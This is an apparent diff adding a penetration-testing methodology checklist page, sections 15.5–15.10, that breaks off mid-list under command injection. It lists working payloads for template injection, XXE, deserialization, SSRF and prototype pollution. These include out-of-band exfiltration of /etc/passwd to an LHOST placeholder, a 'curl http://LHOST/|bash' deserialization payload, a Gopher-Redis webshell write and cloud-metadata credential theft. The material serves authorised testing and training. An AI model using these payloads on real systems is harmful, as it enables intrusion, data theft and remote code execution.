+      <ul>
+        <li><input type="checkbox" data-id="methodology-ssti-other-engines-wf-2-0"> <code>&lt;%= `id` %&gt;</code> or <code>&lt;%= system("id") %&gt;</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ssti-other-engines-wf-3"> EJS (Node.js):
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ssti-other-engines-wf-3-0"> <code>&lt;%= process.mainModule.require("child_process").execSync("id") %&gt;</code></li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-python"># Jinja2 — MRO class traversal RCE
+{{''.__class__.__mro__[1].__subclasses__()[N](['id'], stdout=-1).communicate()[0]}}
+
+# Jinja2 — Flask config globals shortcut
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+
+# Jinja2 — filter bypass (dot and underscore filters)
+{{request|attr('\x5f\x5fglobals\x5f\x5f')}}
+
+# Freemarker (Java)
+&lt;#assign ex = "freemarker.template.utility.Execute"?new()&gt;${ex("id")}
+
+# Twig 2.x/3.x (PHP)
+{{["id"]|map("system")|join}}
+
+# ERB (Ruby)
+&lt;%= `id` %&gt;</code></pre>
+
+<p><strong>General references:</strong> <a href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener noreferrer">PortSwigger SSTI</a> &middot; <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings SSTI</a></p>
+
+<h3 id="methodology-xxe">15.6 XML External Entity Injection</h3>
+<p>Any endpoint that parses XML (file uploads, SOAP, SVG, DOCX) is a candidate. Test for file read first, then escalate.</p>
+<h4 id="methodology-xxe-basic-xxe">15.6.1 Basic XXE</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-xxe-basic-xxe-wf-0"> Test for classic file read:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-xxe-basic-xxe-wf-0-0"> <code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></li>
+        <li><input type="checkbox" data-id="methodology-xxe-basic-xxe-wf-0-1"> Inject the entity reference where output is reflected in the response</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-xxe-basic-xxe-wf-1"> Read source code with PHP wrappers:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-xxe-basic-xxe-wf-1-0"> <code>&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/config.php"&gt;</code></li>
+        <li><input type="checkbox" data-id="methodology-xxe-basic-xxe-wf-1-1"> Decode the base64 to read the full source including <code>&lt;?php</code> tags</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-xxe-basic-xxe-wf-2"> Test for SSRF via XXE:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-xxe-basic-xxe-wf-2-0"> <code>&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;</code></li>
+        <li><input type="checkbox" data-id="methodology-xxe-basic-xxe-wf-2-1"> <code>&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:6379/"&gt;</code> (internal Redis)</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Basic XXE — file read
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+
+# PHP base64 wrapper — read source code including &lt;?php tags
+&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/config.php"&gt;
+
+# SSRF via XXE — AWS metadata
+&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"&gt;</code></pre>
+
+<h4 id="methodology-xxe-blind-xxe">15.6.2 Blind / OOB XXE</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-xxe-blind-xxe-wf-0"> When output is not reflected, use OOB exfiltration:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-xxe-blind-xxe-wf-0-0"> External DTD: <code>&lt;!DOCTYPE foo [&lt;!ENTITY % ext SYSTEM "http://LHOST/evil.dtd"&gt;%ext;]&gt;</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-xxe-blind-xxe-wf-1"> Craft the exfiltration DTD on your server:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-xxe-blind-xxe-wf-1-0"> evil.dtd: <code>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</code></li>
+        <li><input type="checkbox" data-id="methodology-xxe-blind-xxe-wf-1-1"> Then: <code>&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://LHOST/?d=%file;'&gt;"&gt;%eval;%exfil;</code></li>
+        <li><input type="checkbox" data-id="methodology-xxe-blind-xxe-wf-1-2"> Host at <code>python3 -m http.server 80</code> and watch the incoming request</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Blind/OOB XXE — inject in the target XML
+&lt;!DOCTYPE foo [&lt;!ENTITY % ext SYSTEM "http://LHOST/evil.dtd"&gt;%ext;]&gt;
+
+# evil.dtd — host on your server (python3 -m http.server 80)
+&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://LHOST/?d=%file;'&gt;"&gt;
+%eval;
+%exfil;</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-xxe-blind-xxe-wf-2"> CDATA trick for files containing XML metacharacters:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-xxe-blind-xxe-wf-2-0"> Wrap the file content in CDATA sections via parameter entity chaining</li>
+        <li><input type="checkbox" data-id="methodology-xxe-blind-xxe-wf-2-1"> Required when the target file contains <code>&lt;</code>, <code>&gt;</code>, or <code>&amp;</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-xxe-xxe-rce">15.6.3 XXE to RCE</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-xxe-xxe-rce-wf-0"> PHP expect wrapper (if enabled):
+      <ul>
+        <li><input type="checkbox" data-id="methodology-xxe-xxe-rce-wf-0-0"> <code>&lt;!ENTITY xxe SYSTEM "expect://id"&gt;</code> &mdash; direct command execution</li>
+        <li><input type="checkbox" data-id="methodology-xxe-xxe-rce-wf-0-1"> Rare in modern installs but check <code>phpinfo()</code> for <code>expect</code> extension</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-xxe-xxe-rce-wf-1"> Chain XXE &rarr; SSRF &rarr; internal service exploitation:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-xxe-xxe-rce-wf-1-0"> Read cloud metadata IAM credentials via XXE SSRF</li>
+        <li><input type="checkbox" data-id="methodology-xxe-xxe-rce-wf-1-1"> Hit internal admin panels or APIs that trust localhost</li>
+        <li><input type="checkbox" data-id="methodology-xxe-xxe-rce-wf-1-2"> Exploit internal services with known vulnerabilities (Redis, Consul)</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-xxe-xxe-rce-wf-2"> File write via XXE (rare):
+      <ul>
+        <li><input type="checkbox" data-id="methodology-xxe-xxe-rce-wf-2-0"> Some parsers allow <code>SYSTEM</code> entity with <code>file://</code> write semantics</li>
+        <li><input type="checkbox" data-id="methodology-xxe-xxe-rce-wf-2-1"> More common: use the file-read to find credentials, then use those for RCE</li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener noreferrer">PortSwigger XXE</a> &middot; <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings XXE</a></p>
+
+<h3 id="methodology-deserialization">15.7 Insecure Deserialization</h3>
+<p>Identify the serialisation format, find a viable gadget chain, deliver the payload through the right channel.</p>
+<h5>Deserialization Format Quick-Reference</h5>
+<table class="custom-table">
+  <thead>
+    <tr><th>Format</th><th>Magic Bytes</th><th>Tool</th><th>Example Command</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>Java Serialized</td><td><code>rO0AB</code> (b64) / <code>0xACED0005</code></td><td>ysoserial</td><td><code>java -jar ysoserial.jar CommonsCollections6 "id"</code></td></tr>
+    <tr><td>PHP Serialized</td><td><code>O:</code> / <code>a:</code> / <code>s:</code></td><td>PHPGGC</td><td><code>phpggc Laravel/RCE1 system id</code></td></tr>
+    <tr><td>.NET BinaryFormatter</td><td><code>AAEAAAD/////</code> (b64)</td><td>ysoserial.net</td><td><code>ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc"</code></td></tr>
+    <tr><td>Node.js node-serialize</td><td><code>_$$ND_FUNC$$_</code></td><td>Manual IIFE</td><td><code>{"rce":"_$$ND_FUNC$$_function(){...}()"}</code></td></tr>
+    <tr><td>.NET ViewState</td><td><code>/wEP...</code> (b64)</td><td>ysoserial.net</td><td><code>ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd"</code></td></tr>
+  </tbody>
+</table>
+<h4 id="methodology-deserialization-java-deser">15.7.1 Java Deserialization</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-deserialization-java-deser-wf-0"> Identify serialized Java objects:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-deserialization-java-deser-wf-0-0"> Base64 magic: <code>rO0AB</code> (base64 of <code>0xACED0005</code>)</li>
+        <li><input type="checkbox" data-id="methodology-deserialization-java-deser-wf-0-1"> Raw hex magic: <code>0xACED0005</code> at start of binary data</li>
+        <li><input type="checkbox" data-id="methodology-deserialization-java-deser-wf-0-2"> Check cookies, POST parameters, WebSocket messages</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-deserialization-java-deser-wf-1"> Use URLDNS gadget for blind detection:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-deserialization-java-deser-wf-1-0"> <code>java -jar ysoserial.jar URLDNS "http://LHOST/detect" > payload.ser</code></li>
+        <li><input type="checkbox" data-id="methodology-deserialization-java-deser-wf-1-1"> URLDNS triggers a DNS lookup with no dependencies &mdash; works on any JVM</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-deserialization-java-deser-wf-2"> Generate RCE payloads with ysoserial:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-deserialization-java-deser-wf-2-0"> <code>java -jar ysoserial.jar CommonsCollections6 "curl http://LHOST/x" > payload.ser</code></li>
+        <li><input type="checkbox" data-id="methodology-deserialization-java-deser-wf-2-1"> Try multiple gadgets: CommonsCollections1/3/5/6/7, Spring1/2, Groovy1, Jdk7u21</li>
+        <li><input type="checkbox" data-id="methodology-deserialization-java-deser-wf-2-2"> Base64-encode if the transport is text-based</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Java — blind detection with URLDNS (no dependencies, works on any JVM)
+java -jar ysoserial.jar URLDNS "http://LHOST/detect" &gt; payload.ser
+
+# Java — RCE with CommonsCollections6
+java -jar ysoserial.jar CommonsCollections6 "curl http://LHOST/x" &gt; payload.ser
+
+# Base64-encode for text-based transports
+base64 -w0 payload.ser</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-deserialization-java-deser-wf-3"> Check classpath for vulnerable libraries:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-deserialization-java-deser-wf-3-0"> commons-collections 3.x/4.x, commons-beanutils, Spring, Groovy</li>
+        <li><input type="checkbox" data-id="methodology-deserialization-java-deser-wf-3-1"> Enumerate via error messages or <code>/WEB-INF/lib/</code> directory listing</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-deserialization-php-deser">15.7.2 PHP Deserialization</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-deserialization-php-deser-wf-0"> Find unserialize calls in source:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-deserialization-php-deser-wf-0-0"> <code>grep -rn "unserialize\\s*(" src/</code></li>
+        <li><input type="checkbox" data-id="methodology-deserialization-php-deser-wf-0-1"> Check for <code>__wakeup()</code>, <code>__destruct()</code>, <code>__toString()</code> magic methods in classes</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-deserialization-php-deser-wf-1"> Craft a POP chain manually or use PHPGGC:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-deserialization-php-deser-wf-1-0"> <code>phpggc Laravel/RCE1 system id</code></li>
+        <li><input type="checkbox" data-id="methodology-deserialization-php-deser-wf-1-1"> <code>phpggc Symfony/RCE4 exec "curl http://LHOST/|bash"</code></li>
+        <li><input type="checkbox" data-id="methodology-deserialization-php-deser-wf-1-2"> <code>phpggc --list</code> to see all available chains</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># PHP — generate POP chain payloads with PHPGGC
+phpggc Laravel/RCE1 system id
+phpggc Symfony/RCE4 exec "curl http://LHOST/|bash"
+phpggc Monolog/RCE1 system "id"
+phpggc --list                                    # show all available chains</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-deserialization-php-deser-wf-2"> Deliver the payload:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-deserialization-php-deser-wf-2-0"> URL-encode if sent via GET/POST parameter</li>
+        <li><input type="checkbox" data-id="methodology-deserialization-php-deser-wf-2-1"> Base64-encode if the app decodes before unserializing</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-deserialization-dotnet-deser">15.7.3 .NET Deserialization</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-deserialization-dotnet-deser-wf-0"> Generate payloads with ysoserial.net:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-deserialization-dotnet-deser-wf-0-0"> <code>ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64</code></li>
+        <li><input type="checkbox" data-id="methodology-deserialization-dotnet-deser-wf-0-1"> ViewState: <code>ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" --path=/app --decryptionalg=AES --validationalg=SHA1 --decryptionkey=... --validationkey=...</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-deserialization-dotnet-deser-wf-1"> XmlSerializer with ObjectDataProvider:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-deserialization-dotnet-deser-wf-1-0"> Craft an XML payload using ExpandedWrapper + ObjectDataProvider</li>
+        <li><input type="checkbox" data-id="methodology-deserialization-dotnet-deser-wf-1-1"> Target the <code>MethodName</code> and <code>MethodParameters</code> properties</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-deserialization-dotnet-deser-wf-2"> Check for unsafe deserialization in source:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-deserialization-dotnet-deser-wf-2-0"> <code>grep -rn "BinaryFormatter\\|NetDataContract\\|SoapFormatter\\|LosFormatter\\|ObjectStateFormatter" src/</code></li>
+        <li><input type="checkbox" data-id="methodology-deserialization-dotnet-deser-wf-2-1"> Also check for custom <code>ISerializable</code> implementations</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># .NET — generate payloads with ysoserial.net
+ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64
+
+# ViewState exploitation (need keys from web.config or machine.config)
+ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" \
+  --path=/app --decryptionalg=AES --validationalg=SHA1 \
+  --decryptionkey=... --validationkey=...</code></pre>
+
+<h4 id="methodology-deserialization-nodejs-deser">15.7.4 Node.js Deserialization</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-deserialization-nodejs-deser-wf-0"> Identify node-serialize usage:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-deserialization-nodejs-deser-wf-0-0"> <code>grep -rn "node-serialize\\|serialize\\|unserialize" src/</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-deserialization-nodejs-deser-wf-1"> Exploit with IIFE pattern:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-deserialization-nodejs-deser-wf-1-0"> <code>{{"rce":"_$$ND_FUNC$$_function(){{require('child_process').exec('id', function(e,o){{/* */}})}}()"}}</code></li>
+        <li><input type="checkbox" data-id="methodology-deserialization-nodejs-deser-wf-1-1"> The IIFE executes immediately upon deserialization</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-javascript">// Node.js — node-serialize IIFE payload (executes on deserialization)
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){/* */})}()"}</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-deserialization-nodejs-deser-wf-2"> Other Node.js deserialization vectors:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-deserialization-nodejs-deser-wf-2-0"> <code>js-yaml.load()</code> with <code>!!js/function</code> tag (pre-4.0)</li>
+        <li><input type="checkbox" data-id="methodology-deserialization-nodejs-deser-wf-2-1"> Prototype pollution through <code>JSON.parse()</code> with merge operations</li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings Insecure Deserialization</a> &middot; <a href="https://book.hacktricks.xyz/pentesting-web" target="_blank" rel="noopener noreferrer">HackTricks Web</a></p>
+
+<h3 id="methodology-ssrf">15.8 Server-Side Request Forgery</h3>
+<p>Any feature that fetches a URL (webhooks, PDF generators, image importers, URL previews) is an SSRF candidate.</p>
+<h4 id="methodology-ssrf-target-discovery">15.8.1 Target Discovery</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ssrf-target-discovery-wf-0"> Probe cloud metadata endpoints:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ssrf-target-discovery-wf-0-0"> AWS: <code>url=http://169.254.169.254/latest/meta-data/</code></li>
+        <li><input type="checkbox" data-id="methodology-ssrf-target-discovery-wf-0-1"> GCP: <code>url=http://metadata.google.internal/computeMetadata/v1/</code> with header <code>Metadata-Flavor: Google</code></li>
+        <li><input type="checkbox" data-id="methodology-ssrf-target-discovery-wf-0-2"> Azure: <code>url=http://169.254.169.254/metadata/instance?api-version=2021-02-01</code> with header <code>Metadata: true</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ssrf-target-discovery-wf-1"> Scan internal services via SSRF:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ssrf-target-discovery-wf-1-0"> Common targets: Redis (<code>6379</code>), Consul (<code>8500</code>), Docker API (<code>2375</code>), Elasticsearch (<code>9200</code>)</li>
+        <li><input type="checkbox" data-id="methodology-ssrf-target-discovery-wf-1-1"> Internal admin panels: <code>http://127.0.0.1:8080/admin</code></li>
+        <li><input type="checkbox" data-id="methodology-ssrf-target-discovery-wf-1-2"> Other hosts on the same subnet</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ssrf-target-discovery-wf-2"> Blind SSRF detection via timing:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ssrf-target-discovery-wf-2-0"> Compare response times: accessible port vs closed port vs filtered port</li>
+        <li><input type="checkbox" data-id="methodology-ssrf-target-discovery-wf-2-1"> Python script to iterate ports and measure response delays</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-ssrf-filter-bypass">15.8.2 Filter Bypass</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ssrf-filter-bypass-wf-0"> IP address obfuscation:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ssrf-filter-bypass-wf-0-0"> Octal: <code>0177.0.0.1</code> = 127.0.0.1</li>
+        <li><input type="checkbox" data-id="methodology-ssrf-filter-bypass-wf-0-1"> Decimal: <code>2130706433</code> = 127.0.0.1</li>
+        <li><input type="checkbox" data-id="methodology-ssrf-filter-bypass-wf-0-2"> Hex: <code>0x7f000001</code> = 127.0.0.1</li>
+        <li><input type="checkbox" data-id="methodology-ssrf-filter-bypass-wf-0-3"> IPv6: <code>[::1]</code> or <code>[0:0:0:0:0:ffff:127.0.0.1]</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ssrf-filter-bypass-wf-1"> DNS rebinding:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ssrf-filter-bypass-wf-1-0"> <code>127.0.0.1.nip.io</code> resolves to 127.0.0.1</li>
+        <li><input type="checkbox" data-id="methodology-ssrf-filter-bypass-wf-1-1"> <code>127-0-0-1.sslip.io</code> resolves to 127.0.0.1</li>
+        <li><input type="checkbox" data-id="methodology-ssrf-filter-bypass-wf-1-2"> Custom DNS server that alternates between public and internal IPs</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ssrf-filter-bypass-wf-2"> URL parsing tricks:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ssrf-filter-bypass-wf-2-0"> Credential section: <code>http://evil.com@127.0.0.1/</code></li>
+        <li><input type="checkbox" data-id="methodology-ssrf-filter-bypass-wf-2-1"> Fragment: <code>http://127.0.0.1#@evil.com</code></li>
+        <li><input type="checkbox" data-id="methodology-ssrf-filter-bypass-wf-2-2"> Backslash: <code>http://evil.com\\@127.0.0.1</code></li>
+        <li><input type="checkbox" data-id="methodology-ssrf-filter-bypass-wf-2-3"> Double encoding: <code>http://127.0.0.1%252f..%252f</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-ssrf-protocol-smuggling">15.8.3 Protocol Smuggling</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ssrf-protocol-smuggling-wf-0"> Gopher protocol for arbitrary TCP:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ssrf-protocol-smuggling-wf-0-0"> <code>gopher://127.0.0.1:6379/_FLUSHALL%0d%0aSET%20x%20"payload"%0d%0a...</code></li>
+        <li><input type="checkbox" data-id="methodology-ssrf-protocol-smuggling-wf-0-1"> Use Gopher to send raw Redis, SMTP, or MySQL commands</li>
+        <li><input type="checkbox" data-id="methodology-ssrf-protocol-smuggling-wf-0-2"> URL-encode each line with <code>%0d%0a</code> for CRLF</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Gopher — write a webshell via Redis through SSRF
+gopher://127.0.0.1:6379/_FLUSHALL%0d%0a
+SET%20x%20"%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%3F%3E"%0d%0a
+CONFIG%20SET%20dir%20/var/www/html/%0d%0a
+CONFIG%20SET%20dbfilename%20shell.php%0d%0a
+SAVE%0d%0a
+
+# Headless Chrome SSRF — inject into HTML rendered to PDF
+&lt;script&gt;fetch("file:///etc/passwd").then(r=&gt;r.text()).then(t=&gt;fetch("http://LHOST/?"+btoa(t)))&lt;/script&gt;</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ssrf-protocol-smuggling-wf-1"> Headless Chrome / wkhtmltopdf SSRF:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ssrf-protocol-smuggling-wf-1-0"> Inject HTML: <code>&lt;script&gt;fetch("file:///etc/passwd").then(r=>r.text()).then(t=>fetch("http://LHOST/?"+btoa(t)))&lt;/script&gt;</code></li>
+        <li><input type="checkbox" data-id="methodology-ssrf-protocol-smuggling-wf-1-1"> PDF generators that render user-controlled HTML are prime targets</li>
+        <li><input type="checkbox" data-id="methodology-ssrf-protocol-smuggling-wf-1-2"> Also try: <code>&lt;iframe src="file:///etc/passwd"&gt;</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ssrf-protocol-smuggling-wf-2"> HTTP verb tampering for bypasses:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ssrf-protocol-smuggling-wf-2-0"> <code>for V in GET POST PUT DELETE PATCH OPTIONS HEAD; do curl -X $V ...; done</code></li>
+        <li><input type="checkbox" data-id="methodology-ssrf-protocol-smuggling-wf-2-1"> Some SSRF filters only check GET requests</li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://portswigger.net/web-security/ssrf" target="_blank" rel="noopener noreferrer">PortSwigger SSRF</a> &middot; <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings SSRF</a></p>
+
+<h3 id="methodology-proto-pollution">15.9 Prototype Pollution (Node.js)</h3>
+<p>Unsafe recursive merge or deep-copy functions allow attackers to inject properties into <code>Object.prototype</code>, affecting all objects in the application.</p>
+<h4 id="methodology-proto-pollution-discovery">15.9.1 Discovery</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-proto-pollution-discovery-wf-0"> Find unsafe merge/extend functions in source:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-proto-pollution-discovery-wf-0-0"> <code>grep -rn "merge\|assign\|extend\|clone\|deepCopy" src/</code></li>
+        <li><input type="checkbox" data-id="methodology-proto-pollution-discovery-wf-0-1"> Check for custom recursive merge implementations</li>
+        <li><input type="checkbox" data-id="methodology-proto-pollution-discovery-wf-0-2"> Known vulnerable libraries: lodash <code>&lt;4.17.12</code>, jQuery <code>&lt;3.4.0</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-proto-pollution-discovery-wf-1"> Black-box detection:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-proto-pollution-discovery-wf-1-0"> POST JSON: <code>{{"__proto__": {{"polluted": true}}}}</code></li>
+        <li><input type="checkbox" data-id="methodology-proto-pollution-discovery-wf-1-1"> Check if the property appears on unrelated objects in subsequent responses</li>
+        <li><input type="checkbox" data-id="methodology-proto-pollution-discovery-wf-1-2"> Also try: <code>{{"constructor": {{"prototype": {{"polluted": true}}}}}}</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-proto-pollution-exploitation">15.9.2 Exploitation</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-proto-pollution-exploitation-wf-0"> EJS template engine gadget:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-proto-pollution-exploitation-wf-0-0"> <code>{{"__proto__": {{"outputFunctionName": "_tmp1;global.process.mainModule.require('child_process').execSync('id');//"}}}}</code></li>
+        <li><input type="checkbox" data-id="methodology-proto-pollution-exploitation-wf-0-1"> Pollutes the EJS <code>outputFunctionName</code> option, injecting code into the compiled template</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-proto-pollution-exploitation-wf-1"> Pug template engine gadget:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-proto-pollution-exploitation-wf-1-0"> <code>{{"__proto__": {{"block": {{"type": "Text", "line": "process.mainModule.require('child_process').execSync('id')"}}}}}}</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-proto-pollution-exploitation-wf-2"> Handlebars template engine gadget:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-proto-pollution-exploitation-wf-2-0"> <code>{{"__proto__": {{"pendingContent": "&lt;script&gt;...&lt;/script&gt;"}}}}</code></li>
+        <li><input type="checkbox" data-id="methodology-proto-pollution-exploitation-wf-2-1"> Injects content into Handlebars template compilation</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-proto-pollution-exploitation-wf-3"> child_process.spawn shell gadget:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-proto-pollution-exploitation-wf-3-0"> <code>{{"__proto__": {{"shell": true}}}}</code></li>
+        <li><input type="checkbox" data-id="methodology-proto-pollution-exploitation-wf-3-1"> Makes all subsequent <code>child_process.spawn</code> calls use a shell, enabling command injection in arguments</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-javascript">// EJS gadget — pollute outputFunctionName to inject code into compiled template
+{"__proto__": {"outputFunctionName": "_tmp1;global.process.mainModule.require('child_process').execSync('id');//"}}
+
+// Pug gadget — inject into template block compilation
+{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync('id')"}}}
+
+// child_process.spawn shell gadget — makes all spawn calls use a shell
+{"__proto__": {"shell": true}}</code></pre>
+
+<p><strong>General references:</strong> <a href="https://portswigger.net/web-security/prototype-pollution" target="_blank" rel="noopener noreferrer">PortSwigger Prototype Pollution</a> &middot; <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings Prototype Pollution</a></p>
+
+<h3 id="methodology-cmdinj">15.10 Command Injection &amp; Code Execution</h3>
+<p>Test every user input that reaches an OS command or code evaluation function.</p>
+<h4 id="methodology-cmdinj-sink-id">15.10.1 Sink Identification</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-cmdinj-sink-id-wf-0"> PHP command execution sinks:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-cmdinj-sink-id-wf-0-0"> <code>system()</code>, <code>exec()</code>, <code>passthru()</code>, <code>shell_exec()</code>, <code>popen()</code>, <code>proc_open()</code></li>
+        <li><input type="checkbox" data-id="methodology-cmdinj-sink-id-wf-0-1"> Backtick operator: <code>`command`</code></li>
+        <li><input type="checkbox" data-id="methodology-cmdinj-sink-id-wf-0-2"> Code evaluation: <code>eval()</code>, <code>assert()</code>, <code>preg_replace()</code> with <code>/e</code> modifier</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-cmdinj-sink-id-wf-1"> Python command execution sinks:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-cmdinj-sink-id-wf-1-0"> <code>os.system()</code>, <code>subprocess.call()</code>, <code>subprocess.Popen()</code></li>
